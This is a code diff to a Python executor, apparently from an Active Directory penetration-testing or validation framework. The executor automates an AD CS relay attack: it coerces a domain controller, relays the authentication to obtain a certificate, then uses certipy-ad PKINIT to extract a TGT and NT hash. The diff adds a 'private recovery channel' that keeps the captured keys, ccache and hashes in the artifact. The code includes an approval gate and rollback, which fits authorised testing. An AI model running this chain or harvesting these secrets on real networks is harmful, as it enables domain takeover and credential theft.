@@ -55,7 +55,8 @@ from ..recommend import ParamSpec, ParamValue, values
 from ..predicates import file_present_nonempty
 from .. import proof
 from .. import states
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
+from ._reveal_common import key_material, pkinit_hashes
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv, Capability, CAP_CCACHE)
 from .process_manager import poll_for_capture
 from .coercion import COERCION_METHODS, coercion_trigger_argv, machine_account, _short_name
@@ -177,7 +178,18 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
         ]
 
     # ---------------------------------------------------------------- execute
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         ca_host = v["ca_host"]
@@ -205,7 +217,7 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
             gate["classifier"] = "denied"
             gate["op"] = "adcs_relay"
             errors.append("gate_denied:adcs_relay")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "adcs_relay"
@@ -217,9 +229,18 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
         except OSError as exc:
             record("start_listener", listener_argv, None, False, note=f"spawn failed: {exc}")
             errors.append("listener_start_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         record("start_listener", listener_argv, None, True,
                note=f"{self.technique} relay listener on {listener_host or '<local>'}")
+
+        impersonated = machine_account(victim_dc) or victim_dc
+
+        def capture_issued():
+            path = _issued_pfx(out_dir)
+            for reveal in key_material(self.technique, "pfx", impersonated, path):
+                if reveal not in artifact["_reveal"]:
+                    artifact["_reveal"].append(reveal)
+            return path is not None
 
         # 2) coerce the victim; 3) poll for the issued-cert artifact / marker.
         try:
@@ -228,12 +249,13 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
             fired = not (res.timed_out or res.error)
             record("coerce_trigger", trig_argv, res, fired,
                    note=f"method={method}" + ("" if fired else " (trigger did not run)"))
-            success = (lambda out: (_issued_pfx(out_dir) is not None)
+            success = (lambda out: capture_issued()
                        or bool(_RE_ADCS_CERT_ISSUED.search(out)))
             _output, captured = poll_for_capture(
                 ctx.proc_manager, handle, success=success,
                 interval_s=cfg.poll_interval_s, timeout_s=cfg.tool_timeout_s)
         finally:
+            capture_issued()
             final_out = ctx.proc_manager.stop(handle)
 
         captured = (captured or (_issued_pfx(out_dir) is not None)
@@ -242,7 +264,7 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
                note="CA issued a certificate via relay" if captured else "no certificate issued")
         if not captured:
             errors.append(f"{self.technique.lower()}_no_cert")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         mutation["applied"] = True                       # a cert WAS issued on the CA
 
         # 4) PKINIT with the issued pfx -> TGT + NT hash. Prefer the artifact the
@@ -250,13 +272,15 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
         # names when only the cert-issued marker was observed.
         pfx = _issued_pfx(out_dir) or str(
             out_dir / f"{(_short_name(victim_dc) or 'cert').lower()}.pfx")
-        impersonated = machine_account(victim_dc) or victim_dc
+        capture_issued()
         auth_argv = ["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", cfg.dc_ip]
         res = ctx.runner.run(auth_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         auth_ran = True
         auth_out = (res.stdout or "") + (res.stderr or "")
         auth_ok = bool(_RE_AUTH_OK.search(auth_out))
         ccache = self._parse_ccache(auth_out, out_dir)
+        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonated, ccache))
+        artifact["_reveal"].extend(pkinit_hashes(self.technique, impersonated, auth_out))
         record("cert_auth", auth_argv, res, auth_ok,
                note="pkinit ok" if auth_ok else "pkinit failed")
         if not auth_ok:
@@ -282,7 +306,7 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
                 name="rollback_deferred", ok=True, argv_display=[], returncode=None,
                 note="rollback DEFERRED to chain teardown (composed front)"))
             complete = bool(captured and auth_ran)
-            artifact = self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+            finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
             # Secret paths for the engine's deferred teardown; in-memory products
             # for threading. Neither reaches the receipt (_receipt_from ignores
             # both keys) -- H6.
@@ -298,7 +322,7 @@ class _ADCSRelayFrontExecutor(ValidationExecutor):
         if mutation["applied"]:
             errors.append(f"advisory:rotate_credentials:{impersonated}@{cfg.domain}")
         complete = bool(captured and auth_ran and mutation["rollback"]["performed"])
-        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
 
     # ---------------------------------------------------------------- composition (C)
     def produced(self, ctx, finding, params, artifact) -> list[Capability]:
